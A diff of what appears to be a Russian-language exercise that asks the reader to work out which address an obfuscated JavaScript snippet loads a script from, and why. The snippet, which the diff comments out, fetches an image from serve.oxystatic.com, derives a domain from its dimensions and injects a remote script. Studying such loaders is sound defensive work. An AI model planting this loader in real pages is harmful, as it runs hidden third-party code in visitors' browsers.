@@ -8,12 +8,12 @@
 
 2) задание второе:
         Объяснить, с какого адреса данный код
-                <script type="text/javascript" id="73901220182">
-                (function(d,c,b,a,e){
-                    with(new Image)onload=function(){with(this)a.push((1E6+1E3*width+1*height+a).slice(-6).replace(/\d{2}/g,
-                    function(a){return"%"+(+a+97).toString(16)+c.split("")[a%6]})),a.push("com"),a=["/",unescape(a.join(".")),
-                   [(new Date).getTime(),b.domain,e,0].join(",")],b.body.appendChild(b.createElement(c)).src=a.join(a[0])},src=d
-                })("http://serve.oxystatic.com/init","script",document,[],73901220182)
+              <script type="text/javascript" id="73901220182">
+            //    (function(d,c,b,a,e){
+            //        with(new Image)onload=function(){with(this)a.push((1E6+1E3*width+1*height+a).slice(-6).replace(/\d{2}/g,
+            //        function(a){return"%"+(+a+97).toString(16)+c.split("")[a%6]})),a.push("com"),a=["/",unescape(a.join(".")),
+          //         [(new Date).getTime(),b.domain,e,0].join(",")],b.body.appendChild(b.createElement(c)).src=a.join(a[0])},src=d
+          //      })("http://serve.oxystatic.com/init","script",document,[],73901220182)
                 </script>
         подгрузит скрипт, и почему.
 
